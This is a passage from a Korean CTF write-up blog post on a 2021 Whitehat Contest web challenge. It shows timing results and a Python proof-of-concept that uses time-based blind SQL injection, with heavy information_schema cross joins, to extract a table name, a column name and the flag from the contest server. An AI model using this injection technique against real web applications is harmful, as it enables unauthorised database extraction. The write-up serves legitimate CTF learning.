C: C, T: 0:00:02.923604
C: D, T: 0:00:00.043928
C: E, T: 0:00:03.431379
C: F, T: 0:00:03.434538
C: G, T: 0:00:03.437290
C: H, T: 0:00:00.041747
C: I, T: 0:00:02.984453
C: J, T: 0:00:00.044469
C: K, T: 0:00:01.692472
C: L, T: 0:00:00.040697
C: M, T: 0:00:00.034870
C: N, T: 0:00:00.039964
C: O, T: 0:00:01.844985
C: P, T: 0:00:02.975808
C: Q, T: 0:00:00.050623
C: R, T: 0:00:03.314133
C: S, T: 0:00:02.897688
C: T, T: 0:00:03.033871
C: U, T: 0:00:02.356644
C: V, T: 0:00:01.630371
C: W, T: 0:00:00.042096
C: X, T: 0:00:00.042518
C: Y, T: 0:00:00.053940
C: Z, T: 0:00:00.042300
</pre></td></tr></tbody></table></code></div></div>
<p>코드를 돌려보니 위와 같이 꽤나 정확한 오라클 결과들을 얻을 수 있었고, 위 오라클을 기반으로 테이블 명을 뽑아 보다가 <code class="language-plaintext highlighter-rouge">f</code>에서 <code class="language-plaintext highlighter-rouge">files</code>, <code class="language-plaintext highlighter-rouge">flag</code>라는 테이블이 존재하는 것을 확인하였고, 이를 기반으로 컬럼, 레코드 값을 뽑기로 하였습니다.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">str_list</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">Time</span><span class="p">):</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">data</span>
	<span class="n">p</span> <span class="o">=</span> <span class="mi">1</span>
	<span class="k">while</span> <span class="n">p</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
		<span class="n">start</span> <span class="o">=</span> <span class="n">result</span>
		<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">str_list</span><span class="p">:</span>
			<span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
			<span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">format</span><span class="p">((</span><span class="n">result</span> <span class="o">+</span> <span class="n">s</span> <span class="o">+</span> <span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">().</span><span class="nf">hex</span><span class="p">()))</span>
			<span class="nf">if </span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">Time</span><span class="p">:</span>
				<span class="n">result</span> <span class="o">+=</span> <span class="n">s</span>
				<span class="k">break</span>
		<span class="k">if</span> <span class="n">start</span> <span class="o">==</span> <span class="n">result</span><span class="p">:</span>
			<span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Start an exploit</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] The table name is </span><span class="si">{</span><span class="n">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">fl</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">http</span><span class="si">:</span><span class="o">//</span><span class="mf">15.165</span><span class="p">.</span><span class="mf">49.138</span><span class="si">:</span><span class="mi">26354</span><span class="o">/</span><span class="n">ajax_ticks</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">symbol</span><span class="o">=</span><span class="n">btc</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">statistics</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">processlist</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">as</span> <span class="n">m</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">on</span> <span class="n">m</span><span class="p">.</span><span class="n">table_name</span> <span class="n">like</span> <span class="mi">0</span><span class="n">x</span><span class="si">{}</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="n">fl</span><span class="sh">'</span><span class="s">, 1.4)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] The column name is </span><span class="si">{</span><span class="n">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">fl</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">http</span><span class="si">:</span><span class="o">//</span><span class="mf">15.165</span><span class="p">.</span><span class="mf">49.138</span><span class="si">:</span><span class="mi">26354</span><span class="o">/</span><span class="n">ajax_ticks</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">symbol</span><span class="o">=</span><span class="n">btc</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">statistics</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">processlist</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">as</span> <span class="n">m</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">as</span> <span class="n">f</span> <span class="n">on</span> <span class="n">f</span><span class="p">.</span><span class="n">column_name</span> <span class="n">like</span> <span class="mi">0</span><span class="n">x</span><span class="si">{}</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="n">fl</span><span class="sh">'</span><span class="s">, 0.1)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] The flag is </span><span class="si">{</span><span class="n">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">fl</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">http</span><span class="si">:</span><span class="o">//</span><span class="mf">15.165</span><span class="p">.</span><span class="mf">49.138</span><span class="si">:</span><span class="mi">26354</span><span class="o">/</span><span class="n">ajax_ticks</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">symbol</span><span class="o">=</span><span class="n">btc</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">statistics</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">processlist</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">as</span> <span class="n">m</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">cross</span> <span class="n">join</span> <span class="n">flag</span> <span class="k">as</span> <span class="n">c</span> <span class="n">on</span> <span class="n">c</span><span class="p">.</span><span class="n">flag</span> <span class="n">like</span> <span class="mi">0</span><span class="n">x</span><span class="si">{}</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="n">fl</span><span class="sh">'</span><span class="s">, 1.4)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Congratulations for to leak a flag XD</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="https://media.discordapp.net/attachments/857916308892418071/887238985490001930/2021-09-14_4.30.04.png?width=1794&amp;height=753" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/857916308892418071/887238985490001930/2021-09-14_4.30.04.png?width=1794&amp;height=753" alt="" loading="lazy"></a></p>

<p>PoC 코드를 돌려 주면 위 사진처럼 테이블/컬럼 명 및 플래그 릭에 성공하는 것을 확인할 수 있습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : FLAG{d0geg0estom4rs}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Whitehat%20Contest%202021%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWhiteHat-Contest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Whitehat%20Contest%202021%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWhiteHat-Contest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWhiteHat-Contest%2F&text=Whitehat%20Contest%202021%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/microsoft/">Microsoft</a>
      
    </div>
  </section>


            </div>

            
              
              




            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/In-CTF/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>InCTF 2021 Notepad 1.5 - Arthur's Article Write Up</p>
    </a>
  

  
    <a
      href="/posts/CCE/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>CCE 2021 GS 25 Write Up</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/microsoft/">Microsoft</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

